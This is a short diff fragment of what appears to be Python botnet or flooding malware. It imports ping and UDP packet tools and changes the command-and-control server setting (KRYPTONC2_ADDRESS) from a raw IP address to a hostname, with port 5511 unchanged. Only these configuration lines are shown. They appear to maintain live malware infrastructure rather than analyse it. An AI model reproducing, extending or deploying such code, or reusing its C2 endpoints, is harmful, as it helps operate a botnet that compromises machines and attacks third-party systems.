@@ -11,7 +11,7 @@ from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
 # IP AND PORT C2 ------------------->
-KRYPTONC2_ADDRESS  = "34.16.203.187"
+KRYPTONC2_ADDRESS  = "proxy-shiny-potato-21-owlc2.nightowl.dev"
 KRYPTONC2_PORT     = 5511
 
 
